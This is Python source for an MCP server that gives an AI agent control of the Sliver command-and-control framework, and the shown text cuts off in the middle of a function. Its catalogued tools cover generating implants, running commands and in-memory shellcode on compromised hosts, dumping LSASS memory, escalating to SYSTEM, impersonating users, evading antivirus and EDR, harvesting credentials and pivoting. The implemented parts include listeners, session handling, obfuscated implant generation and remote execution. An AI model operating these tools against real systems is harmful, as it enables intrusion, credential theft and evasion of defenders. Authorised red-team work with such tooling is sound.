#!/usr/bin/env python3
"""Sliver C2 MCP Server - agentic control of Sliver via gRPC.

Portable, engagement-agnostic Sliver operator MCP with:
  - 80+ tools covering the full red team lifecycle
  - Engagement state database (targets, creds, findings)
  - OPSEC guard with EDR detection
  - Operator playbooks for compound operations
  - Evasion pipeline integration

Configuration via environment variables:
  SLIVER_CONFIG        - Path to operator .cfg file
  SLIVER_PROJECT_ROOT  - Project root (auto-detected if unset)
  SLIVER_EVASION_DIR   - Evasion scripts directory
  SLIVER_EVIDENCE_DIR  - Evidence collection output
  SLIVER_STATE_DB      - Engagement state database path
  SLIVER_OPSEC_MODE    - OPSEC guard mode: warn|block|silent (default: warn)
"""

from __future__ import annotations

import asyncio
import base64
import json
import os
import re
import shlex
import sqlite3
import sys
from datetime import datetime, timezone
from pathlib import Path
from typing import Any, Optional

from mcp.server.fastmcp import FastMCP

try:
    from sliver import SliverClient, SliverClientConfig
    from sliver.pb.clientpb import client_pb2 as cpb
except ImportError:
    print(
        "sliver-py is not installed. Run: pip3 install sliver-py",
        file=sys.stderr,
    )
    sys.exit(1)

# ---------------------------------------------------------------------------
# Raw protobuf helpers: sliver-py 0.0.19 has mismatched field numbers vs
# the Sliver 1.7.3 server.  For the Generate RPC we build wire-format
# bytes using the *server's* real field numbers so the server deserializes
# them correctly.
#
# Server ImplantConfig fields (client.proto @ 3bbaf805):
#   7:GOOS  8:GOARCH  12:ObfuscateSymbols  50:C2(sub)
#   100:Format  104:IsShellcode  150:HTTPC2ConfigName
#
# Server ImplantC2 fields:
#   2:Priority(uint32)  3:URL(string)
#
# GenerateReq: 1:Config(sub)
# ---------------------------------------------------------------------------


def _varint(value: int) -> bytes:
    buf = bytearray()
    while value > 0x7F:
        buf.append(0x80 | (value & 0x7F))
        value >>= 7
    buf.append(value & 0x7F)
    return bytes(buf)


def _pb_string(num: int, val: str) -> bytes:
    if not val:
        return b""
    data = val.encode("utf-8")
    return _varint((num << 3) | 2) + _varint(len(data)) + data


def _pb_bool(num: int, val: bool) -> bytes:
    if not val:
        return b""
    return _varint((num << 3) | 0) + b"\x01"


def _pb_varint(num: int, val: int) -> bytes:
    if val == 0:
        return b""
    return _varint((num << 3) | 0) + _varint(val)


def _pb_submsg(num: int, data: bytes) -> bytes:
    return _varint((num << 3) | 2) + _varint(len(data)) + data


def _build_implant_c2(url: str, priority: int = 0) -> bytes:
    return _pb_varint(2, priority) + _pb_string(3, url)


def _build_generate_req(
    goos: str,
    goarch: str,
    fmt_val: int,
    is_shellcode: bool,
    obfuscate: bool,
    c2_urls: list[str],
    httpc2_config: str = "default",
) -> "cpb.GenerateReq":
    """Build a GenerateReq with correct Sliver 1.7.3 wire-format field numbers."""
    config_bytes = b""
    config_bytes += _pb_string(7, goos)
    config_bytes += _pb_string(8, goarch)
    config_bytes += _pb_bool(12, obfuscate)
    for url in c2_urls:
        config_bytes += _pb_submsg(50, _build_implant_c2(url))
    config_bytes += _pb_varint(100, fmt_val)
    config_bytes += _pb_bool(104, is_shellcode)
    config_bytes += _pb_string(150, httpc2_config)

    req_bytes = _pb_submsg(1, config_bytes)
    req = cpb.GenerateReq()
    req.ParseFromString(req_bytes)
    return req

# ---------------------------------------------------------------------------
# FastMCP app
# ---------------------------------------------------------------------------

mcp = FastMCP(
    "sliver",
    instructions=(
        "Sliver C2 MCP server. Start with sliver_help for a categorized tool index, "
        "sliver_status to verify the connection, sliver_sessions to list implants, "
        "then sliver_session_info or sliver_discovery for target details."
    ),
)

# ---------------------------------------------------------------------------
# Shared connection state
# ---------------------------------------------------------------------------

_client: Optional[SliverClient] = None
_client_lock = asyncio.Lock()


def _resolve_config_path() -> str:
    """Return the operator config path from env or default location."""
    raw = os.environ.get("SLIVER_CONFIG", "")
    if raw:
        return os.path.expanduser(raw)
    home = Path.home()
    default = home / ".sliver-client" / "configs"
    if default.is_dir():
        cfgs = sorted(default.glob("*.cfg"))
        if cfgs:
            return str(cfgs[0])
    raise FileNotFoundError(
        "No Sliver operator config found. Set SLIVER_CONFIG env var or place "
        "a .cfg file in ~/.sliver-client/configs/. Generate one with: "
        "sliver-server operator --name cursor --lhost localhost --save <path>"
    )


async def _get_client() -> SliverClient:
    """Return a connected SliverClient, reconnecting automatically on stale channels."""
    global _client
    async with _client_lock:
        if _client is not None:
            # is_connected() only checks `_channel is not None`, which is
            # unreliable after idle timeouts or server restarts.  Probe the
            # actual gRPC channel state to detect dead connections.
            try:
                import grpc  # already imported by sliver-py
                state = _client._channel.get_state(try_to_connect=False)
                if state not in (
                    grpc.ChannelConnectivity.READY,
                    grpc.ChannelConnectivity.IDLE,
                ):
                    _client = None  # stale, force reconnect
                else:
                    # Fast liveness check: call version() with a short timeout
                    try:
                        await asyncio.wait_for(_client.version(), timeout=5)
                        return _client
                    except Exception:
                        _client = None  # channel looked OK but RPC failed
            except Exception:
                _client = None  # any introspection failure = reconnect

        config_path = _resolve_config_path()
        config = SliverClientConfig.parse_config_file(config_path)
        client = SliverClient(config)
        await client.connect()
        _client = client
        return _client


def _ts(timestamp: Any) -> str:
    """Format a protobuf timestamp (int64 seconds) to readable string."""
    if not timestamp:
        return ""
    try:
        ts = int(timestamp)
        if ts > 1e15:
            ts = ts // 1_000_000_000
        return datetime.fromtimestamp(ts, tz=timezone.utc).strftime(
            "%Y-%m-%d %H:%M:%S UTC"
        )
    except Exception:
        return str(timestamp)


def _json_out(data: Any, indent: int = 2) -> str:
    """Serialize data to a JSON string for tool responses."""
    return json.dumps(data, indent=indent, default=str)


def _format_tool_error(
    tool: str,
    error: Exception,
    *,
    session_id: str = "",
    context: str = "",
    hints: list[str] | None = None,
) -> str:
    """Return structured JSON for tool failures with actionable hints."""
    msg = str(error)
    auto_hints: list[str] = []
    low = msg.lower()
    if session_id and ("not found" in low or "no session" in low or "unknown session" in low):
        auto_hints.append(
            f"Run sliver_sessions to verify session '{session_id[:8]}...' is still active."
        )
    if "connect" in low or "grpc" in low or "unavailable" in low:
        auto_hints.append("Run sliver_status, then sliver_reconnect if the connection is stale.")
    if "permission" in low or "access denied" in low:
        auto_hints.append("The implant may lack privileges for this operation; try a higher-privilege context.")
    if "timeout" in low:
        auto_hints.append("The command may have hung; retry with a simpler command or check target responsiveness.")
    payload: dict[str, Any] = {
        "status": "error",
        "tool": tool,
        "error_type": type(error).__name__,
        "message": msg,
        "hints": list(hints or []) + auto_hints,
    }
    if session_id:
        payload["session_id"] = session_id
    if context:
        payload["context"] = context
    return _json_out(payload)


def _extract_ip_from_remote_address(addr: str) -> str:
    """Extract IP from a remote address string (may include port)."""
    if not addr:
        return ""
    host = addr.rsplit(":", 1)[0]
    if host.startswith("["):
        host = host.strip("[]")
    return host


def _infer_access_level(username: str) -> str:
    """Infer access level from a Windows username string."""
    if not username:
        return "none"
    low = username.lower()
    if "system" in low or "nt authority\\system" in low:
        return "system"
    if "administrator" in low:
        return "admin"
    return "user"


def _session_object_to_dict(s: Any) -> dict[str, Any]:
    """Convert a Sliver session protobuf object to a plain dict."""
    return {
        "session_id": s.ID,
        "name": s.Name,
        "hostname": s.Hostname,
        "username": s.Username,
        "os": s.OS,
        "arch": s.Arch,
        "transport": s.Transport,
        "remote_address": s.RemoteAddress,
        "pid": s.PID,
        "filename": getattr(s, "Filename", ""),
        "last_checkin": _ts(getattr(s, "LastCheckin", 0)),
    }


def _parse_systeminfo(text: str) -> dict[str, str]:
    """Extract key fields from Windows systeminfo output."""
    fields: dict[str, str] = {}
    for line in text.splitlines():
        if ":" in line:
            key, _, val = line.partition(":")
            fields[key.strip()] = val.strip()
    return {
        "hostname": fields.get("Host Name", ""),
        "os_name": fields.get("OS Name", ""),
        "os_version": fields.get("OS Version", ""),
        "domain": fields.get("Domain", ""),
        "system_type": fields.get("System Type", ""),
    }


def _parse_whoami(text: str) -> dict[str, Any]:
    """Extract user, domain, and admin status from whoami output."""
    result: dict[str, Any] = {
        "username": "",
        "domain": "",
        "is_admin": False,
        "groups": [],
    }
    for line in text.splitlines():
        stripped = line.strip()
        if stripped.startswith("USER NAME:"):
            user = stripped.split(":", 1)[1].strip()
            if "\\" in user:
                result["domain"], result["username"] = user.split("\\", 1)
            elif "@" in user:
                result["username"], _, result["domain"] = user.partition("@")
            else:
                result["username"] = user
        if "S-1-5-32-544" in stripped:
            result["is_admin"] = True
        if "administrator" in stripped.lower() and (
            "group" in stripped.lower() or "->" in stripped
        ):
            result["is_admin"] = True
    if not result["username"] and text.strip() and "USER NAME" not in text:
        first = text.strip().splitlines()[0].strip()
        if "\\" in first:
            result["domain"], result["username"] = first.split("\\", 1)
        else:
            result["username"] = first
    return result


def _parse_ipconfig(text: str) -> list[str]:
    """Extract non-link-local IPv4 addresses from ipconfig output."""
    ips: list[str] = []
    for line in text.splitlines():
        match = re.search(r"IPv4 Address[^:]*:\s*([\d.]+)", line, re.I)
        if match and not match.group(1).startswith("169.254"):
            ips.append(match.group(1))
    return ips


def _build_discovery_summary(sections: dict[str, str]) -> dict[str, Any]:
    """Build a structured summary dict from discovery command sections."""
    whoami = _parse_whoami(sections.get("User Context", ""))
    sysinfo = _parse_systeminfo(sections.get("System Info", ""))
    hostname_raw = sections.get("Hostname", "").strip()
    hostname = hostname_raw.splitlines()[0].strip() if hostname_raw else ""
    hostname = hostname or sysinfo.get("hostname", "")
    ips = _parse_ipconfig(sections.get("Network Config", ""))
    domain = whoami.get("domain") or sysinfo.get("domain", "")
    is_admin = bool(whoami.get("is_admin"))
    admins_text = sections.get("Local Administrators", "").lower()
    user = str(whoami.get("username", ""))
    if user and user.lower() in admins_text:
        is_admin = True
    return {
        "hostname": hostname,
        "domain": domain,
        "username": user,
        "is_admin": is_admin,
        "os_name": sysinfo.get("os_name", ""),
        "os_version": sysinfo.get("os_version", ""),
        "ip_addresses": ips,
        "access_level": "admin" if is_admin else "user",
    }


# ---------------------------------------------------------------------------
# Configurable paths (all overridable via env vars)
# ---------------------------------------------------------------------------


def _detect_project_root() -> str:
    """Auto-detect the project root from this file's location."""
    here = Path(__file__).resolve().parent
    for ancestor in [here, here.parent, here.parent.parent, here.parent.parent.parent]:
        if (ancestor / "evasion").is_dir():
            return str(ancestor)
    return str(here)


PROJECT_ROOT = os.environ.get("SLIVER_PROJECT_ROOT", _detect_project_root())
EVASION_DIR = os.environ.get("SLIVER_EVASION_DIR", f"{PROJECT_ROOT}/evasion")
EVIDENCE_DIR = os.environ.get("SLIVER_EVIDENCE_DIR", "/tmp/sliver-evidence")
STATE_DB_PATH = os.environ.get("SLIVER_STATE_DB", f"{PROJECT_ROOT}/engagement_state.db")
OPSEC_MODE = os.environ.get("SLIVER_OPSEC_MODE", "warn")


async def _run_cmd(
    cmd: list[str], cwd: str | None = None, timeout: int = 300
) -> tuple[int, str, str]:
    """Run a subprocess asynchronously, return (returncode, stdout, stderr)."""
    proc = await asyncio.create_subprocess_exec(
        *cmd,
        stdout=asyncio.subprocess.PIPE,
        stderr=asyncio.subprocess.PIPE,
        cwd=cwd,
    )
    try:
        stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=timeout)
    except asyncio.TimeoutError:
        proc.kill()
        return -1, "", f"Command timed out after {timeout}s"
    return (
        proc.returncode or 0,
        stdout.decode("utf-8", errors="replace"),
        stderr.decode("utf-8", errors="replace"),
    )


async def _exec_on_session(session_id: str, exe: str, args: list[str]) -> str:
    """Run a single command on a session, return combined stdout+stderr text."""
    session = await _interact(session_id)
    result = await session.execute(exe, args, output=True)
    parts = []
    stdout = getattr(result, "Stdout", b"")
    stderr = getattr(result, "Stderr", b"")
    if stdout:
        parts.append(stdout if isinstance(stdout, str) else stdout.decode("utf-8", errors="replace"))
    if stderr:
        parts.append(stderr if isinstance(stderr, str) else stderr.decode("utf-8", errors="replace"))
    return "\n".join(parts) if parts else ""


# =========================================================================
#  SERVER / CONNECTION TOOLS
# =========================================================================


@mcp.tool()
async def sliver_status() -> str:
    """Show Sliver server connection status and version info."""
    try:
        client = await _get_client()
        version = await client.version()
        return json.dumps(
            {
                "connected": True,
                "version": f"{version.Major}.{version.Minor}.{version.Patch}",
                "commit": version.Commit,
                "dirty": version.Dirty,
                "compiled_at": _ts(version.CompiledAt),
                "os": version.OS,
                "arch": version.Arch,
            },
            indent=2,
        )
    except Exception as e:
        return json.dumps({"connected": False, "error": str(e)}, indent=2)


@mcp.tool()
async def sliver_reconnect() -> str:
    """Force-reset the gRPC connection to Sliver server.

    Use when the Sliver server was restarted or the connection went stale.
    """
    global _client
    async with _client_lock:
        _client = None
    try:
        client = await _get_client()
        version = await client.version()
        return json.dumps(
            {
                "status": "reconnected",
                "version": f"{version.Major}.{version.Minor}.{version.Patch}",
            },
            indent=2,
        )
    except Exception as e:
        return _format_tool_error("sliver_reconnect", e, hints=[
            "Verify SLIVER_CONFIG points to a valid operator .cfg file.",
            "Ensure the Sliver teamserver is running and reachable.",
        ])


_TOOL_CATALOG: dict[str, list[dict[str, str]]] = {
    "connection": [
        {"tool": "sliver_status", "purpose": "Check gRPC connection and server version"},
        {"tool": "sliver_reconnect", "purpose": "Force-reset stale gRPC connection"},
        {"tool": "sliver_help", "purpose": "List all tools by category with descriptions"},
        {"tool": "sliver_jobs", "purpose": "List active listeners and jobs"},
        {"tool": "sliver_start_https_listener", "purpose": "Start HTTPS C2 listener"},
        {"tool": "sliver_start_http_listener", "purpose": "Start HTTP C2 listener"},
        {"tool": "sliver_start_dns_listener", "purpose": "Start DNS C2 listener"},
        {"tool": "sliver_stop_job", "purpose": "Kill a listener/job by ID"},
        {"tool": "sliver_operators", "purpose": "List connected teamserver operators"},
    ],
    "sessions": [
        {"tool": "sliver_sessions", "purpose": "List active sessions; auto-registers targets in state DB"},
        {"tool": "sliver_session_info", "purpose": "Detailed JSON info for one session"},
        {"tool": "sliver_beacons", "purpose": "List active beacons"},
        {"tool": "sliver_kill_session", "purpose": "Terminate a session"},
        {"tool": "sliver_kill_beacon", "purpose": "Terminate a beacon"},
        {"tool": "sliver_rename_session", "purpose": "Rename a session"},
        {"tool": "sliver_rename_beacon", "purpose": "Rename a beacon"},
    ],
    "implant_generation": [
        {"tool": "sliver_generate", "purpose": "Generate a new implant payload"},
        {"tool": "sliver_regenerate_implant", "purpose": "Re-download a prior implant build"},
        {"tool": "sliver_implant_builds", "purpose": "List saved implant builds"},
    ],
    "remote_execution": [
        {"tool": "sliver_execute", "purpose": "Run a command on the target"},
        {"tool": "sliver_execute_assembly", "purpose": "Execute .NET assembly in-memory"},
        {"tool": "sliver_execute_shellcode", "purpose": "Execute shellcode in-memory"},
        {"tool": "sliver_sideload", "purpose": "DLL sideloading execution"},
        {"tool": "sliver_get_system", "purpose": "Elevate to SYSTEM via named pipe impersonation"},
        {"tool": "sliver_make_token", "purpose": "Create an access token from credentials"},
        {"tool": "sliver_run_as", "purpose": "Run a command as another user"},
        {"tool": "sliver_impersonate", "purpose": "Impersonate a logged-on user"},
        {"tool": "sliver_revert_to_self", "purpose": "Revert token impersonation"},
        {"tool": "sliver_migrate", "purpose": "Migrate implant to another process"},
        {"tool": "sliver_terminate_process", "purpose": "Kill a remote process by PID"},
        {"tool": "sliver_process_dump", "purpose": "Dump process memory (LSASS, etc.)"},
    ],
    "filesystem": [
        {"tool": "sliver_ls", "purpose": "List remote directory"},
        {"tool": "sliver_cd", "purpose": "Change remote working directory"},
        {"tool": "sliver_pwd", "purpose": "Get remote working directory"},
        {"tool": "sliver_upload", "purpose": "Upload file to target"},
        {"tool": "sliver_download", "purpose": "Download file from target"},
        {"tool": "sliver_rm", "purpose": "Delete remote file/directory"},
        {"tool": "sliver_mkdir", "purpose": "Create remote directory"},
        {"tool": "sliver_screenshot", "purpose": "Capture target desktop screenshot"},
    ],
    "process_network": [
        {"tool": "sliver_ps", "purpose": "List remote processes"},
        {"tool": "sliver_netstat", "purpose": "Show network connections"},
        {"tool": "sliver_ifconfig", "purpose": "Show network interfaces"},
    ],
    "registry_services": [
        {"tool": "sliver_registry_read", "purpose": "Read a registry key/value"},
        {"tool": "sliver_registry_write", "purpose": "Write a registry value"},
        {"tool": "sliver_registry_create_key", "purpose": "Create a registry key"},
        {"tool": "sliver_start_service", "purpose": "Start a Windows service"},
        {"tool": "sliver_stop_service", "purpose": "Stop a Windows service"},
        {"tool": "sliver_remove_service", "purpose": "Remove a Windows service"},
        {"tool": "sliver_get_env", "purpose": "Read environment variable(s)"},
        {"tool": "sliver_set_env", "purpose": "Set an environment variable"},
    ],
    "evasion": [
        {"tool": "sliver_encrypt_shellcode", "purpose": "Encrypt shellcode with evasion scripts"},
        {"tool": "sliver_build_loaders", "purpose": "Build remote/local loader binaries"},
        {"tool": "sliver_evasion_pipeline", "purpose": "Full encrypt-and-load pipeline"},
        {"tool": "sliver_preflight_defender", "purpose": "Scan a file with Windows Defender"},
    ],
    "post_exploitation": [
        {"tool": "sliver_discovery", "purpose": "Full host discovery with structured summary"},
        {"tool": "sliver_lateral_check", "purpose": "Test lateral movement reachability to an IP"},
        {"tool": "sliver_collect_evidence", "purpose": "Screenshot, discovery, and file collection"},
        {"tool": "sliver_opsec_check", "purpose": "Scan for EDR/AV processes on target"},
    ],
    "pivoting": [
        {"tool": "sliver_socks_start", "purpose": "Start SOCKS5 proxy through session"},
        {"tool": "sliver_socks_stop", "purpose": "Stop SOCKS5 proxy"},
        {"tool": "sliver_portfwd_add", "purpose": "Add a port forward"},
        {"tool": "sliver_portfwd_list", "purpose": "List port forwards"},
        {"tool": "sliver_portfwd_rm", "purpose": "Remove a port forward"},
    ],
    "state_database": [
        {"tool": "sliver_state_add_target", "purpose": "Add/update a tracked target"},
        {"tool": "sliver_state_targets", "purpose": "List all tracked targets"},
        {"tool": "sliver_state_auto_discover", "purpose": "Auto-populate state DB from all sessions"},
        {"tool": "sliver_state_add_cred", "purpose": "Log a harvested credential"},
        {"tool": "sliver_state_creds", "purpose": "List logged credentials"},
        {"tool": "sliver_state_add_finding", "purpose": "Log an engagement finding"},
        {"tool": "sliver_state_findings", "purpose": "List findings"},
        {"tool": "sliver_state_log_access", "purpose": "Log an access event"},
        {"tool": "sliver_state_summary", "purpose": "Dashboard counts and stats"},
        {"tool": "sliver_state_export", "purpose": "Export full state as JSON"},
        {"tool": "sliver_state_add_pivot", "purpose": "Record a pivot path between targets"},
    ],
    "cleanup": [
        {"tool": "sliver_cleanup_target", "purpose": "Remove artifacts from a target"},
        {"tool": "sliver_full_cleanup", "purpose": "Kill all sessions and stop listeners"},
    ],
    "hosting": [
        {"tool": "sliver_website_add", "purpose": "Host a file on the C2 web server"},
        {"tool": "sliver_websites", "purpose": "List hosted website content"},
    ],
    "playbooks": [
        {"tool": "sliver_playbook_initial_recon", "purpose": "Initial recon with summary and state DB logging"},
        {"tool": "sliver_playbook_privesc_check", "purpose": "Privilege escalation assessment"},
        {"tool": "sliver_playbook_cred_harvest", "purpose": "Credential store enumeration"},
        {"tool": "sliver_playbook_persist_check", "purpose": "Persistence location assessment"},
    ],
}


@mcp.tool()
async def sliver_help(category: str = "") -> str:
    """Return a categorized index of all available Sliver MCP tools.

    Use this to self-discover capabilities. Optionally filter by category name
    (connection, sessions, remote_execution, post_exploitation, state_database,
    playbooks, etc.).

    Args:
        category: Optional category filter (case-insensitive partial match).
    """
    if category:
        needle = category.lower()
        filtered = {
            cat: tools
            for cat, tools in _TOOL_CATALOG.items()
            if needle in cat.lower()
        }
        if not filtered:
            return _json_out({
                "status": "not_found",
                "message": f"No category matching '{category}'.",
                "available_categories": sorted(_TOOL_CATALOG.keys()),
            })
        catalog = filtered
    else:
        catalog = _TOOL_CATALOG

    total = sum(len(tools) for tools in catalog.values())
    return _json_out({
        "total_tools": total,
        "categories": sorted(catalog.keys()),
        "catalog": catalog,
        "quick_start": [
            "1. sliver_status - verify connection",
            "2. sliver_sessions - list active implants",
            "3. sliver_session_info - inspect a session",
            "4. sliver_discovery or sliver_playbook_initial_recon - enumerate target",
            "5. sliver_state_summary - view engagement progress",
        ],
    })


@mcp.tool()
async def sliver_jobs() -> str:
    """List all active Sliver jobs (listeners, stagers, etc.)."""
    client = await _get_client()
    jobs = await client.jobs()
    active = jobs.Active if hasattr(jobs, "Active") else jobs
    if not active:
        return "No active jobs."
    rows = []
    for j in active:
        rows.append(
            {
                "id": j.ID,
                "name": j.Name,
                "protocol": j.Protocol,
                "port": j.Port,
                "description": getattr(j, "Description", ""),
            }
        )
    return json.dumps(rows, indent=2)


@mcp.tool()
async def sliver_start_https_listener(
    lhost: str,
    lport: int = 443,
) -> str:
    """Start an HTTPS C2 listener.

    Args:
        lhost: IP address or hostname to bind the listener to.
        lport: Port number (default 443).
    """
    client = await _get_client()
    try:
        job = await client.start_https_listener(lhost, lport)
        return json.dumps(
            {"status": "started", "job_id": job.JobID, "lhost": lhost, "lport": lport},
            indent=2,
        )
    except Exception as e:
        return f"Failed to start HTTPS listener: {e}"


@mcp.tool()
async def sliver_start_dns_listener(
    domains: str = "",
    lport: int = 53,
    host: str = "0.0.0.0",
) -> str:
    """Start a DNS C2 listener.

    Args:
        domains: Comma-separated C2 domains (optional, for lab can be empty).
        lport: Port number (default 53).
        host: Interface to bind to. Default: 0.0.0.0 (all interfaces).
    """
    client = await _get_client()
    domain_list = [d.strip() for d in domains.split(",") if d.strip()] if domains else []
    try:
        job = await client.start_dns_listener(domains=domain_list, host=host, port=lport)
        return json.dumps(
            {
                "status": "started",
                "job_id": job.JobID,
                "domains": domain_list or ["(none - IP direct)"],
                "lport": lport,
            },
            indent=2,
        )
    except Exception as e:
        return f"Failed to start DNS listener: {e}"


@mcp.tool()
async def sliver_stop_job(job_id: int) -> str:
    """Kill a running job (listener, stager, etc.) by its job ID.

    Args:
        job_id: The numeric job ID to stop (from sliver_jobs output).
    """
    client = await _get_client()
    try:
        await client.kill_job(job_id)
        return f"Job {job_id} stopped."
    except Exception as e:
        return f"Failed to stop job {job_id}: {e}"


# =========================================================================
#  SESSION / BEACON MANAGEMENT
# =========================================================================


@mcp.tool()
async def sliver_sessions(auto_register: bool = True) -> str:
    """List all active Sliver sessions (interactive implants).

    When auto_register is True (default), each session's host metadata is
    automatically upserted into the engagement state database.

    Args:
        auto_register: Auto-register session hosts in the state DB (default: True).
    """
    try:
        client = await _get_client()
        sessions = await client.sessions()
        if not sessions:
            return _json_out({
                "count": 0,
                "sessions": [],
                "message": "No active sessions.",
                "state_db": {"auto_register": auto_register, "registered": []},
            })
        rows = [_session_object_to_dict(s) for s in sessions]
        state_updates: list[dict[str, Any]] = []
        if auto_register:
            for s in sessions:
                try:
                    state_updates.append(_register_session_target(s, s.ID))
                except Exception as exc:
                    state_updates.append({
                        "session_id": s.ID,
                        "action": "error",
                        "message": str(exc),
                    })
        return _json_out({
            "count": len(rows),
            "sessions": rows,
            "state_db": {
                "auto_register": auto_register,
                "registered": state_updates,
            },
        })
    except Exception as e:
        return _format_tool_error("sliver_sessions", e, hints=[
            "Ensure the Sliver server is running and SLIVER_CONFIG points to a valid operator config.",
        ])


@mcp.tool()
async def sliver_session_info(session_id: str) -> str:
    """Return detailed structured info about a specific Sliver session.

    Includes hostname, OS, user, PID, transport, remote address, and state DB
    linkage if the target has been registered.

    Args:
        session_id: The session ID to inspect (from sliver_sessions output).
    """
    try:
        client = await _get_client()
        sessions = await client.sessions()
        match = None
        for s in sessions:
            if s.ID == session_id:
                match = s
                break
        if not match:
            return _json_out({
                "status": "not_found",
                "session_id": session_id,
                "message": "Session not found among active sessions.",
                "hints": [
                    "Run sliver_sessions to list currently active session IDs.",
                    "The session may have died; check beacons with sliver_beacons.",
                ],
            })
        info = _session_object_to_dict(match)
        info["access_level"] = _infer_access_level(match.Username or "")
        info["ip"] = _extract_ip_from_remote_address(match.RemoteAddress or "")
        db = _get_state_db()
        target_row = db.execute(
            "SELECT id, access_level, notes FROM targets WHERE hostname = ?",
            (match.Hostname,),
        ).fetchone()
        if target_row:
            info["state_db"] = {
                "target_id": target_row["id"],
                "access_level": target_row["access_level"],
                "notes": target_row["notes"],
            }
        else:
            info["state_db"] = None
        return _json_out({"status": "ok", "session": info})
    except Exception as e:
        return _format_tool_error("sliver_session_info", e, session_id=session_id)


@mcp.tool()
async def sliver_beacons() -> str:
    """List all active Sliver beacons (asynchronous implants)."""
    client = await _get_client()
    beacons = await client.beacons()
    if not beacons:
        return "No active beacons."
    rows = []
    for b in beacons:
        rows.append(
            {
                "beacon_id": b.ID,
                "name": b.Name,
                "hostname": b.Hostname,
                "username": b.Username,
                "os": b.OS,
                "arch": b.Arch,
                "transport": b.Transport,
                "remote_address": b.RemoteAddress,
                "interval": b.Interval,
                "jitter": b.Jitter,
                "next_checkin": _ts(b.NextCheckin),
            }
        )
    return json.dumps(rows, indent=2)


@mcp.tool()
async def sliver_kill_session(session_id: str) -> str:
    """Kill / terminate an active session.

    Args:
        session_id: The session ID to kill (from sliver_sessions output).
    """
    client = await _get_client()
    try:
        session = await client.interact_session(session_id)
        await client.kill_session(session_id)
        return f"Session {session_id} killed."
    except Exception as e:
        return f"Failed to kill session {session_id}: {e}"


@mcp.tool()
async def sliver_generate(
    c2_url: str,
    target_os: str = "windows",
    arch: str = "amd64",
    output_format: str = "shellcode",
    save_path: str = "/tmp/implant.bin",
    skip_symbols: bool = True,
) -> str:
    """Generate a new Sliver implant/payload.

    Uses raw protobuf construction to work around field-number mismatches
    between sliver-py 0.0.19 and the Sliver 1.7.3 server.

    Args:
        c2_url: C2 callback URL, e.g. 'https://10.0.0.1:443' or 'dns://10.0.0.1'.
        target_os: Target OS (windows, linux, darwin). Default: windows.
        arch: Target architecture (amd64, 386, arm64). Default: amd64.
        output_format: Output format (exe, shellcode, shared, service). Default: shellcode.
        save_path: Local path to save the generated implant. Default: /tmp/implant.bin.
        skip_symbols: Strip debug symbols for smaller file. Default: true.
    """
    client = await _get_client()
    try:
        fmt_val = {
            "shellcode": 1,
            "exe": 2,
            "shared": 0,
            "service": 3,
        }.get(output_format, 1)

        url = c2_url
        if not url.startswith(("http", "dns")):
            url = f"https://{url}"

        req = _build_generate_req(
            goos=target_os,
            goarch=arch,
            fmt_val=fmt_val,
            is_shellcode=(output_format == "shellcode"),
            obfuscate=skip_symbols,
            c2_urls=[url],
        )

        result = await client._stub.Generate(req, timeout=360)

        implant_data = result.File.Data
        implant_name = result.File.Name
        if implant_data:
            Path(save_path).write_bytes(implant_data)

        return json.dumps(
            {
                "status": "generated",
                "name": implant_name,
                "save_path": save_path,
                "size_bytes": len(implant_data) if implant_data else 0,
                "os": target_os,
                "arch": arch,
                "format": output_format,
            },
            indent=2,
        )
    except Exception as e:
        return f"Failed to generate implant: {e}"


# =========================================================================
#  IMPLANT INTERACTION TOOLS
# =========================================================================


async def _interact(session_id: str):
    """Get an interactive session handle, retrying once on stale connections."""
    global _client
    try:
        client = await _get_client()
        return await client.interact_session(session_id)
    except Exception:
        # First attempt failed; force reconnect and retry once.
        async with _client_lock:
            _client = None
        client = await _get_client()
        return await client.interact_session(session_id)


@mcp.tool()
async def sliver_execute(
    session_id: str,
    exe: str,
    args: str = "",
) -> str:
    """Execute a command on a remote system via a Sliver session.

    Args:
        session_id: Target session ID.
        exe: Executable or command to run (e.g. 'whoami', 'cmd.exe', 'powershell.exe').
        args: Space-separated arguments (e.g. '/all' or '-Command Get-Process').
    """
    try:
        session = await _interact(session_id)
        arg_list = shlex.split(args) if args else []
        result = await session.execute(exe, arg_list, output=True)
        output_parts = []
        stdout = getattr(result, "Stdout", b"")
        stderr = getattr(result, "Stderr", b"")
        if stdout:
            text = stdout if isinstance(stdout, str) else stdout.decode("utf-8", errors="replace")
            output_parts.append(f"[stdout]\n{text}")
        if stderr:
            text = stderr if isinstance(stderr, str) else stderr.decode("utf-8", errors="replace")
            output_parts.append(f"[stderr]\n{text}")
        if not output_parts:
            return "(command returned no output)"
        return "\n".join(output_parts)
    except Exception as e:
        return _format_tool_error(
            "sliver_execute", e, session_id=session_id,
            context=f"exe={exe!r} args={args!r}",
            hints=["Verify the executable name and arguments are valid for the target OS."],
        )


@mcp.tool()
async def sliver_ls(session_id: str, path: str = ".") -> str:
    """List directory contents on a remote system.

    Args:
        session_id: Target session ID.
        path: Remote path to list (default: current directory).
    """
    try:
        session = await _interact(session_id)
        result = await session.ls(path)
        if not result.Files:
            return f"Empty directory: {result.Path}"
        rows = []
        for f in result.Files:
            rows.append(
                {
                    "name": f.Name,
                    "size": f.Size,
                    "is_dir": f.IsDir,
                    "mode": f.Mode,
                    "modified": _ts(f.ModTime),
                }
            )
        header = f"Directory: {result.Path}\n"
        return header + json.dumps(rows, indent=2)
    except Exception as e:
        return _format_tool_error("sliver_ls", e, session_id=session_id, context=f"path={path!r}")


@mcp.tool()
async def sliver_cd(session_id: str, path: str) -> str:
    """Change the implant's working directory.

    Args:
        session_id: Target session ID.
        path: Remote path to change to.
    """
    try:
        session = await _interact(session_id)
        result = await session.cd(path)
        return f"Changed directory to: {result.Path}"
    except Exception as e:
        return _format_tool_error("sliver_cd", e, session_id=session_id, context=f"path={path!r}")


@mcp.tool()
async def sliver_pwd(session_id: str) -> str:
    """Get the implant's current working directory.

    Args:
        session_id: Target session ID.
    """
    try:
        session = await _interact(session_id)
        result = await session.pwd()
        return f"Current directory: {result.Path}"
    except Exception as e:
        return _format_tool_error("sliver_pwd", e, session_id=session_id)


@mcp.tool()
async def sliver_ps(session_id: str) -> str:
    """List processes on the remote system.

    Args:
        session_id: Target session ID.
    """
    try:
        session = await _interact(session_id)
        ps_result = await session.ps()
        processes = _normalize_process_list(ps_result)
        if not processes:
            return "No processes returned."
        rows = []
        for p in processes:
            rows.append(
                {
                    "pid": p.Pid,
                    "ppid": p.Ppid,
                    "executable": p.Executable,
                    "owner": p.Owner,
                    "architecture": getattr(p, "Architecture", ""),
                }
            )
